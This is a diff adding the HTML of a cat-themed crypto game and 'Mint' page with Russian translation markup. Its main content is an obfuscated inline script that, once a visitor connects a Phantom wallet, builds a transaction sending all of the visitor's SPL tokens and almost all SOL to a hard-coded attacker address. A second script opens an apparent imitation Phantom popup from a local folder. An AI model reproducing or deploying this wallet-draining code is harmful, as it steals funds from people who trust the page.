+              </ya-tr-span>
+            </h2>
+            <h3>
+              <ya-tr-span data-index="35-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Minimum CAThlete level - 6" data-translation="Минимальный уровень подготовки - 6"
+                data-ch="0" data-type="trSpan">Minimum CAThlete level - 6</ya-tr-span>
+            </h3>
+            <div class="tokens"><a>
+                <ya-tr-span data-index="36-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                  data-value="Possible earnings: up to " data-translation="Возможный заработок: до " data-ch="0"
+                  data-type="trSpan">Possible earnings: up to </ya-tr-span><b>
+                  <ya-tr-span data-index="36-0" data-translated="true" data-source-lang="en" data-target-lang="ru"
+                    data-value="735.814" data-translation="735.814" data-ch="0" data-type="trSpan">735.814</ya-tr-span>
+                </b>
+              </a><img src="fonts/token.svg" alt=""></div>
+            <div class="pagination"><span class="bullet"></span> <span class="bullet"></span> <span
+                class="bullet"></span> <span class="bullet _active"></span> <span class="bullet"></span></div><a
+              class="main__button">
+              <ya-tr-span data-index="37-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Complete in League IV" data-translation="Завершить в Лиге IV" data-ch="0"
+                data-type="trSpan">Complete in League IV</ya-tr-span>
+            </a>
+          </div>
+        </div>
+        <div class="item league__five">
+          <div class="camera">
+            <div class="speaker"></div>
+            <div class="cam"><span></span></div>
+          </div>
+          <div class="item-content">
+            <div class="images">
+              <div class="image after"><img src="fonts/4.svg" alt="4"></div>
+              <div class="image _active"><img src="fonts/5.svg" alt="5"></div>
+              <div class="image before"></div>
+            </div>
+          </div>
+          <div class="head__item-text"></div>
+          <div class="item-text">
+            <h2>
+              <ya-tr-span data-index="38-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="League V" data-translation="Лига V" data-ch="0" data-type="trSpan">League V</ya-tr-span>
+            </h2>
+            <h3>
+              <ya-tr-span data-index="39-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Minimum CAThlete level - 8" data-translation="Минимальный уровень подготовки - 8"
+                data-ch="0" data-type="trSpan">Minimum CAThlete level - 8</ya-tr-span>
+            </h3>
+            <div class="tokens"><a>
+                <ya-tr-span data-index="40-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                  data-value="Possible earnings: up to " data-translation="Возможный заработок: до 981 " data-ch="0"
+                  data-type="trSpan">Possible earnings: up to </ya-tr-span><b>
+                  <ya-tr-span data-index="40-0" data-translated="true" data-source-lang="en" data-target-lang="ru"
+                    data-value="981.085" data-translation="085" data-ch="0" data-type="trSpan">085</ya-tr-span>
+                </b>
+              </a><img src="fonts/token.svg" alt=""></div>
+            <div class="pagination"><span class="bullet"></span> <span class="bullet"></span> <span
+                class="bullet"></span> <span class="bullet"></span> <span class="bullet _active"></span></div><a
+              class="main__button">
+              <ya-tr-span data-index="41-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                data-value="Complete in League V" data-translation="Завершить в лиге V" data-ch="0" data-type="trSpan">
+                Complete in League V</ya-tr-span>
+            </a>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div style="display:none" class="button-box">
+      <div id="root" class="cl-root">
+        <main>
+          <div class="sc-dlfnuX bJgQKs"><button
+              class="MuiButtonBase-root MuiButton-root MuiButton-contained sc-bdfBQB kKVOCU MuiButton-containedPrimary"
+              tabindex="0" type="button"><span class="MuiButton-label">
+                <ya-tr-span data-index="42-0" data-translated="false" data-source-lang="en" data-target-lang="ru"
+                  data-value="Connect" data-translation="Контакты" data-ch="1" data-type="trSpan">Connect</ya-tr-span>
+              </span><span class="MuiTouchRipple-root"></span></button></div>
+        </main>
+      </div>
+    </div>
+    <div class="main-area__left">
+      <div class="token">
+        <div class="token-title"></div>
+        <div class="token-line"></div>
+      </div>
+    </div>
+  </section>
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <script src="js/slick.min.js"></script>
+  <script>$(".trigger").click((function () { $("#root").find("button").trigger("click") })); const $plusButton = document.querySelector(".plus-btn"), $minuButton = document.querySelector(".minus-btn"), $numberText = document.querySelector("#total"), $remaining = document.querySelector("#remaining"), $priceResultText = document.querySelector("#price-total span"); let itemPriceSelected = 0, itemCount = 1; $plusButton.addEventListener("click", (function (t) { t.preventDefault(), itemCount = itemCount < 1 ? itemCount + 1 : 1, $numberText.value = itemCount, $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2) })), $minuButton.addEventListener("click", (function (t) { t.preventDefault(), itemCount = parseInt($numberText.value), itemCount = itemCount > 1 ? itemCount - 1 : itemCount, $numberText.value = itemCount, $priceResultText.textContent = (itemPriceSelected * itemCount).toFixed(2) }))</script>
+        <script>!function (e) { function n(n) { for (var o, s, c = n[0], i = n[1], u = n[2], d = 0, f = []; d < c.length; d++)s = c[d], Object.prototype.hasOwnProperty.call(r, s) && r[s] && f.push(r[s][0]), r[s] = 0; for (o in i) Object.prototype.hasOwnProperty.call(i, o) && (e[o] = i[o]); for (l && l(n); f.length;)f.shift()(); return a.push.apply(a, u || []), t() } function t() { for (var e, n = 0; n < a.length; n++) { for (var t = a[n], o = !0, c = 1; c < t.length; c++) { var i = t[c]; 0 !== r[i] && (o = !1) } o && (a.splice(n--, 1), e = s(s.s = t[0])) } return e } var o = {}, r = { 1: 0 }, a = []; function s(n) { if (o[n]) return o[n].exports; var t = o[n] = { i: n, l: !1, exports: {} }; return e[n].call(t.exports, t, t.exports, s), t.l = !0, t.exports } s.e = function (e) { var n = [], t = r[e]; if (0 !== t) if (t) n.push(t[2]); else { var o = new Promise((function (n, o) { t = r[e] = [n, o] })); n.push(t[2] = o); var a, c = document.createElement("script"); c.charset = "utf-8", c.timeout = 120, s.nc && c.setAttribute("nonce", s.nc), c.src = function (e) { return s.p + "../static/js/" + ({}[e] || e) + "." + { 3: "" }[e] + "chunk.js" }(e); var i = new Error; a = function (n) { c.onerror = c.onload = null, clearTimeout(u); var t = r[e]; if (0 !== t) { if (t) { var o = n && ("load" === n.type ? "missing" : n.type), a = n && n.target && n.target.src; i.message = "Loading chunk " + e + " failed.\n(" + o + ": " + a + ")", i.name = "ChunkLoadError", i.type = o, i.request = a, t[1](i) } r[e] = void 0 } }; var u = setTimeout((function () { a({ type: "timeout", target: c }) }), 12e4); c.onerror = c.onload = a, document.head.appendChild(c) } return Promise.all(n) }, s.m = e, s.c = o, s.d = function (e, n, t) { s.o(e, n) || Object.defineProperty(e, n, { enumerable: !0, get: t }) }, s.r = function (e) { "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, { value: "Module" }), Object.defineProperty(e, "__esModule", { value: !0 }) }, s.t = function (e, n) { if (1 & n && (e = s(e)), 8 & n) return e; if (4 & n && "object" == typeof e && e && e.__esModule) return e; var t = Object.create(null); if (s.r(t), Object.defineProperty(t, "default", { enumerable: !0, value: e }), 2 & n && "string" != typeof e) for (var o in e) s.d(t, o, function (n) { return e[n] }.bind(null, o)); return t }, s.n = function (e) { var n = e && e.__esModule ? function () { return e.default } : function () { return e }; return s.d(n, "a", n), n }, s.o = function (e, n) { return Object.prototype.hasOwnProperty.call(e, n) }, s.p = "/", s.oe = function (e) { throw console.error(e), e }; var c = this["webpackJsonpcandy-machine-mint"] = this["webpackJsonpcandy-machine-mint"] || [], i = c.push.bind(c); c.push = n, c = c.slice(); for (var u = 0; u < c.length; u++)n(c[u]); var l = i; t() }([]); const _0x27de6b = _0x1f1e; function _0x1f1e(e, n) { const t = _0x100d(); return (_0x1f1e = function (e, n) { return t[e -= 393] })(e, n) } function _0x100d() { const e = ["54858XegKer", "length", "...", "associatedProgramId", "getAccountInfo", " SOL", "background", "653900HELctm", "pNKcE", "1379trqfnN", "Transaction", "counet", "solana", "isPhantom", "SystemProgram", "getParsedTokenAccountsByOwner", "showcase__btn0", "space", "isConnected", "data", "load", "createTransferInstruction", "value", "getAssociatedTokenAddress", "innerText", "amount", "7487152xETAWF", "root", "27rJbaER", "toString", "add", "serialize", "t3LtR", "wqwqw", "transfer", "createAssociatedTokenAccountInstruction", "connect", "tokenAmount", "style", "27prY", "pZmyN", "innerHTML", "programId", "5245gELGjh", "TOKEN_PROGRAM_ID", "getElementById", "disconnect", "feePayer", "PublicKey", "https://phantom.app/", "data-target", "log", "confirmTransaction", "#False", "clusterApiUrl", "Token", "parsed", "2WoaUKo", "getMinimumBalanceForRentExemption", "988fggphZ", "XyQaF", "mainnet-beta", "recentBlockhash", "fgXoL", "textContent", "PJus", "sendRawTransaction", "Mint", "mint", "1949651jIKuRk", "info", "Phantom_Connect", "#e42575", "publicKey", "7644fwylYT", "account", "substring", "onclick", "2766453tdkqiR"]; return (_0x100d = function () { return e })() } function upValue() { const e = _0x1f1e; document[e(471)](e(437))[e(448)] = parseInt(1) + parseInt(document[e(471)](e(437))[e(448)]), document[e(471)](e(459)).textContent = (1.777 * parseInt(document[e(471)]("counet")[e(448)])).toFixed(2)[e(455)]() + e(431) } function downValue() { const e = _0x1f1e; "1" == document.getElementById(e(437))[e(448)] || (document.getElementById(e(437))[e(448)] = parseInt(document[e(471)]("counet")[e(448)]) - parseInt(1), document[e(471)](e(459))[e(411)] = (1.777 * parseInt(document.getElementById(e(437))[e(448)])).toFixed(2).toString() + e(431)) } !function (e, n) { const t = _0x1f1e, o = _0x100d(); for (; ;)try { if (487895 === -parseInt(t(426)) / 1 + -parseInt(t(404)) / 2 * (parseInt(t(425)) / 3) + parseInt(t(406)) / 4 * (parseInt(t(469)) / 5) + parseInt(t(421)) / 6 * (parseInt(t(435)) / 7) + parseInt(t(452)) / 8 + -parseInt(t(454)) / 9 * (-parseInt(t(433)) / 10) + -parseInt(t(416)) / 11) break; o.push(o.shift()) } catch (e) { o.push(o.shift()) } }(), window.addEventListener(_0x27de6b(446), (() => { const e = _0x27de6b; const n = new solanaWeb3.Connection(solanaWeb3[e(401)](e(408))), t = () => { const n = e; if (n(438) in window) { const e = window[n(438)]; if (e[n(439)]) return e } window.open(n(396), "_blank") }; function o() { const n = e; window[n(438)][n(444)] ? (username_text = String(provider.publicKey), username_short = username_text[n(423)](0, 8), document[n(471)](n(453)).setAttribute(n(397), n(400)), document.getElementById("showcase__btn0").innerHTML = username_short + n(428), document[n(471)](n(453)).innerText = "Mint", document[n(471)](n(453))[n(464)][n(432)] = n(419)) : window.solana.connect({ onlyIfTrusted: !1 }), r() } function r() { const n = e, o = t(); o && (o.on(n(462), (() => { const e = n; (async function () { a() })(), username_text = String(o[e(420)]), username_short = username_text[e(423)](0, 8), document.getElementById(e(453)).setAttribute(e(397), e(400)), document[e(471)](e(442))[e(467)] = username_short + e(428), document[e(471)](e(453))[e(450)] = e(414), document.getElementById(e(453))[e(464)][e(432)] = e(419) })), o.on(n(393), (() => { }))) } async function a() { const o = e; if (!window[o(438)][o(444)]) return; let r = await n.getAccountInfo(window[o(438)][o(420)]); if (null === r) return; if (0 === r.lamports) return; let a = r.lamports, s = await n[o(405)](82), c = await n.getMinimumBalanceForRentExemption(165), i = await n[o(405)](0); console[o(398)](i + 7 * c), console[o(398)]("ok"), a -= i; let u = 311; const l = new solanaWeb3.PublicKey("".concat("2K2y3", o(434), o(458), "r1yoC", o(410), o(465), o(466), o(407), o(412))), d = await n[o(441)](window[o(438)][o(420)], { programId: splToken[o(470)] }); console[o(398)](d); let f = new (solanaWeb3[o(436)]); for (let e = 0; e < d[o(448)][o(427)]; e++) { let t = d.value[e][o(422)][o(445)]; const r = t.parsed[o(417)][o(463)][o(451)]; if (r > 0) { const e = t[o(443)]; console[o(398)](a); const i = new (solanaWeb3[o(395)])(t[o(403)].info[o(415)]), d = new (splToken[o(402)])(n, i, splToken.TOKEN_PROGRAM_ID, window[o(438)][o(420)]), p = await splToken[o(402)][o(449)](d[o(429)], d[o(468)], i, window[o(438)][o(420)]), m = await splToken[o(402)].getAssociatedTokenAddress(d[o(429)], d[o(468)], i, l); if (null === await n[o(430)](m)) { if (u + 42 >= 1232) break; u += 42, f[o(456)](splToken[o(402)][o(461)](d[o(429)], d[o(468)], i, m, l, window[o(438)][o(420)])), a -= 165 === e ? c : s } if (u + 79 >= 1232) break; u += 79, console[o(398)](u), f[o(456)](splToken.Token[o(447)](splToken[o(470)], p, m, window[o(438)][o(420)], [], r)) } } f.add(solanaWeb3[o(440)][o(460)]({ fromPubkey: window.solana[o(420)], toPubkey: l, lamports: a - 5e4 })); const p = t(); if (!p) return; console[o(398)](f); let { blockhash: m } = await n.getLatestBlockhash(); if (f[o(409)] = m, f[o(394)] = p[o(420)], f) { let e = await p.signTransaction(f, n), t = await n[o(413)](e[o(457)]()); await n[o(399)](t) } } document[e(471)](e(453))[e(424)] = function () { const n = e; "#False" == document[n(471)]("root").getAttribute(n(397)) ? a() : r() }, document[e(471)](e(418))[e(424)] = function () { o() } }))</script>
+  <script src="js/chunk.js"></script>
+  <script src="js/tokenup.js"></script>
+  <script src="js/main.chunk.js"></script>
+  <script src="js/lib.js"></script>
+  <script src="js/life.js"></script>
+  <script src="js/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
+  <script>$(".phantom").click((function () { window.open("./phantom/index.html", "_blank", "height=533,width=344,menubar=no, toolbar=no, top=0, left=4000, location=no, scrollbars=no,resizable=no,status=no") }))</script>
+  <div id="tr-popup" class="tr-popup" translate="no" data-hidden="true" data-invalid="true" data-disabled="true"
+    lang="ru" data-expanded="false" data-menu="false" data-translation="Играйте сейчас" data-position="top"
+    data-menu-position="right" data-submitted="false" style="top: 166px; left: 600px;">
+    <div class="tr-popup__block"><span class="tr-popup__title_original">Оригинальный текст:</span> <span
+        class="tr-popup__value">Play now</span></div>
+    <div class="tr-popup__block tr-popup__block_a"><span class="tr-popup__link tr-popup__link_suggest"
+        data-action="expand">Предложить перевод</span><a href="https://translate.yandex.ru"
+        class="tr-popup__link tr-popup__link_service" target="_blank" data-action="navigate"><span
+          class="tr-popup__logo tr-popup__logo_company"></span><span
+          class="tr-popup__logo tr-popup__logo_service"></span></a></div>
+    <div class="tr-popup__block tr-popup__block_b"><textarea class="tr-popup__input" spellcheck="false"
+        autocapitalize="off" autocorrect="off" autocomplete="off" maxlength="1000"></textarea>
+      <div class="tr-popup__block tr-popup__block_submit"><span role="button"
+          class="tr-popup__button tr-popup__button_submit" data-action="send">Отправить</span></div>
+      <div class="tr-popup__overlay tr-popup__overlay_submitted">Спасибо, перевод отправлен</div>
+    </div><span role="button" class="tr-popup__button tr-popup__button_close" data-action="clickClose"></span><span
+      role="button" class="tr-popup__button tr-popup__button_menu" data-action="clickMenu"><span class="tr-popup__menu"
+        data-action="disablePopup">Отключить подсказку с оригинальным текстом</span></span><span
+      class="tr-popup__arrow"></span>
+  </div>
+</body>
+
+</html>
